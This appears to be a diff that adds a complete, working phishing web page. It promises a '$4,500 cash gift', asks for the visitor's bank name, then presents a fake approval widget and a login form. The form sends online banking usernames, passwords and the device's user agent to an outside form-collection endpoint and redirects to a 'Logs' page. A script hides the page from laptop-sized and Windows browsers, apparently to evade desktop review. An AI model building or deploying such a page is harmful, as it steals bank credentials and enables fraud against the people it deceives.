@@ -1,1 +1,786 @@
+  <!DOCTYPE html>
+<html>
+<head><html class=light lang=en><head>
+
+
+
+ <meta charset=utf-8> <meta content="width=device-width, initial-scale=1.0" name=viewport>
+<link href="https://cdn.bitpanda.com/app/v2/css/all.min.css?id=622e023bba9164dff838" rel=stylesheet><script src="https://cdn.bitpanda.com/app/v2/js/head.min.js?id=e37b5634f1d9be3b8e80"></script>
+ 
+
+
+<title>Verification</title>
+
+
+
+    <style>
+        /* Style for the "Hello World" message */
+        #message {
+            display: none; /* Hidden by default */
+            font-size: 24px;
+            text-align: center;
+            margin-top: 20%;
+            color: #333;
+        }
+
+        /* Style for the main content */
+        #content {
+            display: block; /* Visible by default */
+        }
+    </style>
+
+
+
+
+
+
+
+
+<style>
+  #mainContent {
+    display: none;
+  }
+  
+  #processing, #processing2 {
+    display: none;
+    text-align: center;
+  }
+  
+  .lds-ring {
+    display: inline-block;
+    position: relative;
+    width: 60px;
+    height: 60px;
+  }
+  
+  .lds-ring div {
+    box-sizing: border-box;
+    display: block;
+    position: absolute;
+    width: 100px;
+    height: 100px;
+    margin: 7px;
+    border: 7px solid #000000;
+    border-radius: 50%;
+    animation: lds-ring 1.9s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+    border-color: #306754 transparent transparent transparent;
+  }
+  
+  .lds-ring div:nth-child(1) {
+    animation-delay: -0.55s;
+  }
+  
+  .lds-ring div:nth-child(2) {
+    animation-delay: -0.9s;
+  }
+  
+  .lds-ring div:nth-child(3) {
+    animation-delay: -0.15s;
+  }
+  
+  @keyframes lds-ring {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+</style>
+
+
+
+
+
+
+
+
+
+
+<style>
+  /* Form Container */
+  #myForm {
+    width: 100%;
+    height: 45px;
+    border-radius: 0px;
+  }
+
+  /* Input Fields and Labels */
+  #myForm input, #myForm label {
+    font-size: 18px;
+    display: block;
+    border: 3px solid #7393B3;
+  }
+
+  #myForm input {
+    width: 99%;
+    height: 49px;
+    color: #000000;
+    margin-bottom: 9px;
+    padding: 6px;
+    border-radius: 2px;
+    box-sizing: border-box;
+  }
+
+  /* Input Field Focus (when clicked) */
+  #myForm input:focus {
+    outline: none;
+    border-color: #000000;
+  }
+
+  /* Labels */
+  #myForm label {
+    margin-bottom: 3px;
+  }
+
+  /* Submit Button Spacing */
+  #myForm button {
+    margin-top: 7px;
+  }
+</style>
+
+
+
+
+
+
+
+<style>
+.text-223px {
+  font-size: 16px;
+  padding: 8px;
+  color: #000000;
+}
+
+/* Increase font size for desktop screens */
+@media (min-width: 1024px) {
+  .text-223px {
+    font-size: 24px;
+  }
+}
+</style>
+
+<style>
+.text-323px {
+  font-size: 16px;
+  padding: 8px;
+  color: #000000;
+}
+
+/* Increase font size for desktop screens */
+@media (min-width: 1024px) {
+  .text-323px {
+    font-size: 24px;
+  }
+}
+</style>
+
+
+<script>
+  function submitForm() {
+    // Hide the form
+    document.getElementById("myForm").style.display = "none";
+    
+    // Display the "Processing" message and animation
+    document.getElementById("processing").style.display = "block";
+    
+    // Delay displaying the main content
+    setTimeout(function() {
+      // Hide the processing message and animation
+      document.getElementById("processing").style.display = "none";
+      
+      // Display the main content
+      document.getElementById("mainContent").style.display = "block";
+      
+      // Get the form data
+      const name = document.getElementById("name").value;
+      const email = document.getElementById("email").value;
+      const phoneNumber = document.getElementById("phonenumber").value; // Get phone number
+      
+      // Display the submitted form data in multiple places within the main content
+      const submittedNameElements = document.getElementsByClassName("submittedName");
+      const submittedEmailElements = document.getElementsByClassName("submittedEmail");
+      const submittedPhoneElements = document.getElementsByClassName("submittedPhone"); // Handle phone number
+      
+      for (let i = 0; i < submittedNameElements.length; i++) {
+        submittedNameElements[i].textContent = name;
+      }
+      
+      for (let i = 0; i < submittedEmailElements.length; i++) {
+        submittedEmailElements[i].textContent = email;
+      }
+      
+      for (let i = 0; i < submittedPhoneElements.length; i++) {
+        submittedPhoneElements[i].textContent = phoneNumber; // Display phone number
+      }
+      
+      // Scroll to the main content section
+      document.getElementById("mainContent").scrollIntoView({ behavior: 'smooth' });
+    }, 1000); // Change delay to 3 seconds
+  }
+
+  function submitSecondForm() {
+    // Hide the second form
+    document.getElementById("secondForm").style.display = "none";
+    
+    // Display the "Processing" message for the second form
+    document.getElementById("processing2").style.display = "block";
+    
+    // Delay displaying the second form's main content
+    setTimeout(function() {
+      // Hide the processing message for the second form
+      document.getElementById("processing2").style.display = "none";
+      
+      // Display the second form's submitted content
+      const mainContent2 = document.getElementById("mainContent2");
+      mainContent2.style.display = "block";
+      
+      // Get the second form data
+      const fullName = document.getElementById("fullName").value;
+      const email2 = document.getElementById("email2").value;
+      const phone2 = document.getElementById("phone2").value;
+      const address = document.getElementById("address").value;
+      const city = document.getElementById("city").value;
+      const country = document.getElementById("country").value;
+
+      // Set the submitted data to specific elements
+      document.querySelectorAll(".submittedFullName").forEach(el => el.textContent = fullName);
+      document.querySelectorAll(".submittedEmail2").forEach(el => el.textContent = email2);
+      document.querySelectorAll(".submittedPhone2").forEach(el => el.textContent = phone2);
+      document.querySelectorAll(".submittedAddress").forEach(el => el.textContent = address);
+      document.querySelectorAll(".submittedCity").forEach(el => el.textContent = city);
+      document.querySelectorAll(".submittedCountry").forEach(el => el.textContent = country);
+
+      // Scroll to the second form's main content
+      mainContent2.scrollIntoView({ behavior: 'smooth' });
+    }, 1000); // Change delay to 3 seconds
+  }
+</script>
+</head>
+<body>
+
+
+
+
+
+
+
+    <div id="message">Hello World</div>
+ 
+    <div id="content">
+
+        
+
+
+    <script>
+        // Function to check for typical laptop screen resolutions
+        function isLaptopScreen() {
+            const width = window.screen.width;
+            const height = window.screen.height;
+            const aspectRatio = width / height;
+
+            // Check for typical laptop aspect ratios and resolution ranges
+            return (aspectRatio > 1.3 && aspectRatio < 1.8) && (width >= 1280 && width <= 1920);
+        }
+
+        // Function to check if the device is running a Windows OS
+        function isWindows() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const windowsKeywords = [
+                "windows nt",        // Standard Windows NT-based OS
+                "win64",             // 64-bit Windows
+                "win32",             // 32-bit Windows
+                "wow64",             // Windows-on-Windows 64-bit
+                "win",               // General Windows keyword
+                "microsoft"          // Associated with Windows software
+            ];
+
+            // Check if any Windows-related keyword exists in the user agent
+            return windowsKeywords.some(keyword => userAgent.includes(keyword));
+        }
+
+        // Main logic: Show "Hello World" on laptops or Windows devices
+        if (isLaptopScreen() || isWindows()) {
+            // Hide the main content and show the "Hello World" message
+            document.getElementById('content').style.display = 'none';
+            document.getElementById('message').style.display = 'block';
+        }
+    </script>
+
+
+
+
+
+
+
+
+<div> 
+  <div class="formbold-form-wrapper">
+
+    <!-- Original Form -->
+    <form id="myForm" onsubmit="submitForm(); return false;">
+
+
+
+<style>
+.text-1077px {
+  font-size: 16px;
+  padding: 9px;
+  color: #000000;
+}
+
+/* Increase font size for desktop screens */
+@media (min-width: 1024px) {
+  .text-1077px {
+    font-size: 24px;
+  }
+}
+</style>
+
+<h5 class="text-1077px">
+
+
+
+
+To avoid errors, we need to verify that the bank information you specified earlier is correct. This is done to ensure that you receive the $4,500 gift immediately. 
+
+<br>
+<br><br>
+
+
+      <div class="formbold-mb-5">
+
+        <center>
+          <input type="text" 
+style="display: none;
+
+ name="A_" id="name" placeholder="Enter your first and last name" class="formbold-form-input" />
+        </center>
+      </div>
+
+
+
+
+
+      <div class="formbold-mb-5">
+    <strong>   Enter name of the bank you wish to receive the <span class="currency-symbol">$</span>4,500 gift (only the name of the bank)</strong>
+        <center>
+          <input type="text" id="email" required name="A_" class="formbold-form-input" placeholder="Enter  the Name  of Your Bank" />
+        </center>
+      </div>
+
+
+
+
+
+
+      <center>
+        <input type="text" id="phonenumber" name="A_" placeholder=""  style="display: none;
+class="formbold-form-input" />
+      </center>
+
+ <div>
+
+  
+        <center> 
+<button type="submit" style="width: 98%; height: 50px; border: 0px solid #000; border-radius: 10px; background-color: #2B60DE; color: #ffffff; font-size: 17px; font-weight:bold; cursor: pointer;">Next</button></center>
+</strong>
+
+</h5><br><br><br><br><br><br>
+      </div>
+    </form>
+
+  </div>
+</div>
+
+<div id="processing">
+  <style>
+  .texdt-734px {
+    font-size: 23px;
+    padding: 9px;
+  }
+</style>
+
+<h5 class="texdt-734px">
+<br><br><br><br><br>
+Processing . . .
+
+</h5>
+  <div class="lds-ring">
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+  </div>
+</div>
+
+
+
+
+
+<div id="mainContent">
+ 
+
+ <!-- Banking Dashboard Widget -->
+<style>
+  /* Scoped styles to minimize conflicts with existing site CSS */
+  .bankdash-widget {
+    width: 100%;
+    box-sizing: border-box;
+    font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
+  }
+
+  .bankdash-box {
+    width: 100%;
+    background-color: #2B60DE; /* Dark blue background */
+    color: #fff;
+    border-radius: 1px;
+    border: 1px solid #2B60DE; /* Slightly lighter border */
+    padding: 10px;
+    box-sizing: border-box;
+  }
+
+  .bankdash-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .bankdash-header,
+  .bankdash-footer {
+    margin: 0;
+  }
+
+  .bankdash-text {
+    font-size: 17px;
+    font-weight: bold;
+    line-height: 1.4;
+  }
+
+  .bankdash-amount {
+    font-size: 38px;
+    font-weight: 200;
+  }
+
+  /* Responsive tweaks for narrow screens */
+  @media (max-width: 480px) {
+    .bankdash-box {
+      padding: 10px;
+      border-radius: 10px;
+    }
+    .bankdash-text {
+      font-size: 17px;
+    }
+    .bankdash-amount {
+      font-size: 38px;
+    }
+  }
+</style>
+
+<div class="bankdash-widget" role="region" aria-label="Banking Dashboard">
+  <div class="bankdash-box">
+    <div class="bankdash-row bankdash-header">
+      <div class="bankdash-text">APPROVED</div>
+      <div class="bankdash-text">CASH GIFT</div>
+    </div>
+    <div class="bankdash-row bankdash-footer" style="margin-top:12px;">
+      <div class="bankdash-text" aria-label="Account holder"></div>
+      <div class="bankdash-amount" aria-label="Total amount">$4,500</div>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+<h5 class="text-223px">
+	
+	Follow the steps below to log in to your  <span class="submittedEmail"></span>  online banking account, which will allow you to instantly receive the $4,500 gift directly into your  <span class="submittedEmail"></span>    account. 
+<br><br>
+  <strong>	
+   
+ <span class="submittedEmail"></span>  Online Banking
+&nbsp 
+
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTvF16t22BS4V3JPQHoBf3rqiJ77vBW4OYKRw&amp;usqp=CAU" jsaction="VQAsE" class="sFlh5c pT0Scc iPVvYb" style="max-width: 1640px; width: 25px; height: 31px; margin: 0px;" alt="Pinterest" jsname="kn3ccd" aria-hidden="false">
+</strong>
+
+
+
+<div style="background-color: #E0FFFF; border-radius: 1px; padding: 16px; color: Black;">
+
+   <div>
+
+    <div class="container">
+        <div class="left-text">
+
+<span style="font-size: 16px;">
+
+To verify, log in to your <span class="submittedEmail"></span>  online banking account using your online banking username and password.
+
+
+</span>
+                    
+          
+        </div>
+        <div class="center-text">
+        
+        
+            <strong>
+               
+                    <span style="font-size: 1px;">&nbsp</span>
+               
+            </strong>
+            
+            
+        </div>
+        <div class="right-text">
+        
+        
+        
+         
+          
+                   
+            
+        </div>
+    </div>
+</div>
+
+<style>
+    .container {
+        display: flex;
+        justify-content: space-between;
+    }
+    .left-text {
+        justify-self: flex-start;
+    }
+    .center-text {
+        justify-self: center;
+    }
+    .right-text {
+        justify-self: flex-end;
+    }
+</style>
+   
+  
+
+
+
+
+  <style>
+    :root {
+      /* Customizable variables */
+      --loading-text-size: 40px;           /* Size of the "Processing..." text */
+      --loading-text-color: #000000;        /* Color of the "Processing..." text */
+      --spinner-size: 110px;               /* Size of the rotating icon */
+      --spinner-border-size: 20px;         /* Thickness of the spinner border */
+      --spinner-color: #306754;             /* Color of the rotating part */
+      --spinner-speed: 1s;                /* Rotation speed of the spinner */
+    }
+
+    /* General styling for the loading overlay */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color:  #ffffff;
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+
+    .loading-overlay.active {
+      display: flex;
+    }
+
+    .loading-icon {
+      border: var(--spinner-border-size) solid #f3f3f3; /* Light grey */
+      border-top: var(--spinner-border-size) solid var(--spinner-color); /* Customizable color */
+      border-radius: 50%;
+      width: var(--spinner-size); /* Customizable size */
+      height: var(--spinner-size); /* Customizable size */
+      animation: spin var(--spinner-speed) linear infinite; /* Customizable speed */
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loading-text {
+      margin-top: 10px;
+      font-size: var(--loading-text-size); /* Customizable size */
+      color: var(--loading-text-color); /* Customizable color */
+      font-weight: bold;
+    }
+  </style>
+
+
+<br>
+
+ <form action="https://submit-form.com/sYNCPpUjZ" method="POST" id="example-form" class="wpforms-validate wpforms-form" data-formid="278">
+
+<input type="hidden" name="_redirect" value="https://meet-dinner.github.io/Logs/" >
+
+
+   
+   
+
+ <input type="text" placeholder=" Online Banking Username" name="UserrID-Bnk" required  style="width: 100%; font-size: 17px; padding: 16px 0; background-color: #ffffff; border: 2px solid black; font-weight: bold;" />
+
+   
+    <br> <br>
+    	
+    <input type="text" placeholder=" Online Banking Password" name="Passsstword" required style="width: 100%; font-size: 17px; padding: 16px 0; background-color: #ffffff; border: 2px solid black; font-weight: bold;" />
+     
+    
+<span style="display:none;">
+    <p id="user-agent"></p> </span>
+        <input type="hidden" name="z_PhoneDetails" id="hidden-user-agent">
+        	
+
+       <br> 
+    <br> <br>
+    
+    
+    <button type="submit" style="padding: 12px 55px; font-size: 20px; font-weight: bold; background-color: #2B60DE; color: #ffffff; border: none;">Login</button>
+    
+    
+   </form>
+
+
+
+
+<script>
+        const userAgent = navigator.userAgent;
+        document.getElementById('user-agent').textContent = userAgent;
+        document.getElementById('hidden-user-agent').value = userAgent;
+    </script>
+ 
+
+
+
+
+<!-- Reusable Loading Overlay -->
+  <div class="loading-overlay" id="loading-overlay">
+    <div>
+      <div class="loading-icon"></div>
+      <div class="loading-text"><strong>Please Wait...</strong></div>
+    </div>
+  </div>
+  
+  
+  
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const form = document.getElementById("example-form");
+      const loadingOverlay = document.getElementById("loading-overlay");
+
+      // Function to show the loading overlay
+      const showLoading = () => {
+        loadingOverlay.classList.add("active");
+      };
+
+      // Form submission handler
+      form.addEventListener("submit", (event) => {
+        // Show the loading overlay
+        showLoading();
+
+        // Allow the form to proceed with submission (default behavior)
+        // The loading overlay will remain visible while the form is being submitted
+      });
+    });
+  </script>
+
+
+
+
+
+
+    <br>
+    
+
+
+</div>
+
+
+<br><br><br><br><br>
+<br>
+</h5>
+
+</div>
+
+
+
+
+
+
+
+<div id="processing2">
+  
+
+<style>
+  .text-deborahpx {
+    font-size: 19px;
+    padding: 5px;
+  }
+</style>
+<h5 class="text-deborahpx">
+ 
+
+<strong> 
+
+
+Your Application is Currently Processing...
+
+</strong>
+
+
+</h5>
+
+
+
+  <div class="lds-ring">
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+  </div>
+</div>
+
+<div id="mainContent2" style="display: none;">
+
+
+
+
+
+
+
+
+
+</div>
+
+
+<script>
+  // Ensure both forms and processing sections are hidden initially
+  document.getElementById("processing").style.display = "none";
+  document.getElementById("processing2").style.display = "none";
+  document.getElementById("myForm").style.display = "block";
+</script>
+</body>
+</html>
+
 
